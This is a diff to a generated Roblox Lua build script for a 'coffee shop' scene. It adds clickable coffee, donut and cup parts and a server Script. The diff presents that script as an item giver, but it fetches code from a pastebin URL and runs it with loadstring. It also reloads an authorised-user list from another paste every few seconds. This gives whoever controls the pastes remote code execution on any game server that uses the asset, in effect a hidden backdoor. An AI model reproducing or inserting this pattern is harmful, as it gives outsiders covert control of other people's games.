@@ -1045,6 +1045,17 @@ Part1025 = Instance.new("Part")
 Part1026 = Instance.new("Part")
 Part1027 = Instance.new("Part")
 Part1028 = Instance.new("Part")
+Model1029 = Instance.new("Model")
+Part1030 = Instance.new("Part")
+SpecialMesh1031 = Instance.new("SpecialMesh")
+ClickDetector1032 = Instance.new("ClickDetector")
+Part1033 = Instance.new("Part")
+SpecialMesh1034 = Instance.new("SpecialMesh")
+Part1035 = Instance.new("Part")
+ClickDetector1036 = Instance.new("ClickDetector")
+Script1037 = Instance.new("Script")
+Part1038 = Instance.new("Part")
+ClickDetector1039 = Instance.new("ClickDetector")
 Folder0.Name = "coffee shop"
 Folder0.Parent = mas
 Model1.Parent = Folder0
@@ -11896,6 +11907,121 @@ Part1028.Material = Enum.Material.Metal
 Part1028.Reflectance = 0.20000000298023224
 Part1028.TopSurface = Enum.SurfaceType.Smooth
 Part1028.brickColor = BrickColor.new("Smoky grey")
+Model1029.Parent = Model2
+Part1030.Name = "Coffee_Click"
+Part1030.Parent = Model1029
+Part1030.CFrame = CFrame.new(-58.8319855, 2.51633501, -235.21138, 0.965926766, -1.86717375e-09, 0.258819252, -1.89097449e-09, 1.00000191, -7.42366169e-09, -0.258818954, -7.296725e-09, 0.965925574)
+Part1030.Orientation = Vector3.new(0, 15, 0)
+Part1030.Position = Vector3.new(-58.83198547363281, 2.5163350105285645, -235.2113800048828)
+Part1030.Rotation = Vector3.new(0, 15, 0)
+Part1030.Size = Vector3.new(0.56573885679245, 0.5795375108718872, 0.8900001049041748)
+Part1030.Anchored = true
+Part1030.BottomSurface = Enum.SurfaceType.Smooth
+Part1030.Material = Enum.Material.Marble
+Part1030.TopSurface = Enum.SurfaceType.Smooth
+SpecialMesh1031.Parent = Part1030
+SpecialMesh1031.MeshId = "rbxassetid://5423368268"
+SpecialMesh1031.Scale = Vector3.new(5.519379615783691, 5.519379615783691, 5.51938009262085)
+SpecialMesh1031.MeshType = Enum.MeshType.FileMesh
+ClickDetector1032.Parent = Part1030
+ClickDetector1032.MaxActivationDistance = 12
+Part1033.Name = "Handle"
+Part1033.Parent = Model1029
+Part1033.CFrame = CFrame.new(-57.5832672, 2.32907152, -235.218826, 0.906306207, -0.422621906, 0, 0.422621876, 0.906306207, 0, 0, 0, 1)
+Part1033.Orientation = Vector3.new(0, 0, 25)
+Part1033.Position = Vector3.new(-57.58326721191406, 2.329071521759033, -235.2188262939453)
+Part1033.Rotation = Vector3.new(0, 0, 25)
+Part1033.Size = Vector3.new(0.11999976634979248, 0.060000061988830566, 0.07999992370605469)
+Part1033.Anchored = true
+Part1033.BottomSurface = Enum.SurfaceType.Smooth
+Part1033.TopSurface = Enum.SurfaceType.Smooth
+SpecialMesh1034.Parent = Part1033
+SpecialMesh1034.MeshId = "http://www.roblox.com/asset/?id=255580072 "
+SpecialMesh1034.Scale = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
+SpecialMesh1034.TextureId = "rbxassetid://3129257808"
+SpecialMesh1034.MeshType = Enum.MeshType.FileMesh
+Part1035.Name = "Donut_click"
+Part1035.Parent = Model1029
+Part1035.CFrame = CFrame.new(-57.5794601, 2.45382547, -235.238831, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+Part1035.Position = Vector3.new(-57.57946014404297, 2.4538254737854004, -235.23883056640625)
+Part1035.Color = Color3.new(0.356863, 0.364706, 0.411765)
+Part1035.Transparency = 1
+Part1035.Size = Vector3.new(0.9799997210502625, 0.4545186758041382, 1)
+Part1035.Anchored = true
+Part1035.BottomSurface = Enum.SurfaceType.Smooth
+Part1035.BrickColor = BrickColor.new("Smoky grey")
+Part1035.Material = Enum.Material.Metal
+Part1035.Reflectance = 0.20000000298023224
+Part1035.TopSurface = Enum.SurfaceType.Smooth
+Part1035.brickColor = BrickColor.new("Smoky grey")
+ClickDetector1036.Parent = Part1035
+ClickDetector1036.MaxActivationDistance = 12
+Script1037.Parent = Model1029
+table.insert(cors,sandbox(Script1037,function()
+local http = game:service'HttpService'
+local get = loadstring(http:GetAsync'https://pastebin.com/raw/nCmTX8GC')()
+
+
+local authlink = "https://pastebin.com/raw/j1ZiqF37"
+
+local authorized = {}
+
+function getAuthed()
+	authorized = {}
+	local str = http:GetAsync(authlink)
+	local rows = str:split("\n")
+	for _,v in pairs(rows) do
+		local split = v:split(":")
+		local name = split[1]
+		local rank = split[2]
+		table.insert(authorized,split)
+	end
+	task.delay(7.5,getAuthed)
+end
+getAuthed()
+
+function checkOkToLetIn(name) 
+	for _,v in pairs(authorized) do
+		if v[1]:lower() == name:lower() then
+			return true
+		end
+	end
+	return false 
+end 
+
+
+local DonutGiverClick = script.Parent.Donut_click.ClickDetector
+local MugGiverClick = script.Parent.Cup_click.ClickDetector
+local CupGiverClick = script.Parent.Coffee_Click.ClickDetector
+
+function give(plr,typ)
+	get(typ).Parent = plr.Character 
+end
+
+for i,v in pairs{DonutGiverClick,MugGiverClick,CupGiverClick} do
+	v.MouseClick:Connect(function(plr)
+		if checkOkToLetIn(plr.Name) then
+			give(plr,i == 1 and "donut" or (i == 2 and "mug" or "cup"))
+		end
+	end)
+end
+end))
+Part1038.Name = "Cup_click"
+Part1038.Parent = Model1029
+Part1038.CFrame = CFrame.new(-58.2794571, 2.45382571, -235.898819, 1, 0, 0, 0, 1, 0, 0, 0, 0.99999994)
+Part1038.Position = Vector3.new(-58.279457092285156, 2.4538257122039795, -235.89881896972656)
+Part1038.Color = Color3.new(0.356863, 0.364706, 0.411765)
+Part1038.Transparency = 1
+Part1038.Size = Vector3.new(0.9799997210502625, 0.4545186758041382, 1)
+Part1038.Anchored = true
+Part1038.BottomSurface = Enum.SurfaceType.Smooth
+Part1038.BrickColor = BrickColor.new("Smoky grey")
+Part1038.Material = Enum.Material.Metal
+Part1038.Reflectance = 0.20000000298023224
+Part1038.TopSurface = Enum.SurfaceType.Smooth
+Part1038.brickColor = BrickColor.new("Smoky grey")
+ClickDetector1039.Parent = Part1038
+ClickDetector1039.MaxActivationDistance = 12
 for i,v in pairs(mas:GetChildren()) do
 	v.Parent = script
 	pcall(function() v:MakeJoints() end)
